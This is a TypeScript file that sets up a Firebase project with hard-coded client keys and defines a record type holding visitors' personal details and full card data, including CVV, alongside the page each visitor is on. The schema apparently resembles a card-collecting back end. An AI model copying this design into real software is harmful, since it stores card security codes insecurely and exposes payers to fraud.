import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
   apiKey: "AIzaSyBSBQlPHwbrkBxeQ54RZw6jGUkfcBAeI-0",
  authDomain: "moror-7892f.firebaseapp.com",
  projectId: "moror-7892f",
  storageBucket: "moror-7892f.firebasestorage.app",
  messagingSenderId: "644937901522",
  appId: "1:644937901522:web:e9fcf90e8d6d187f7b140b",
  measurementId: "G-FEC36WC9S7"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

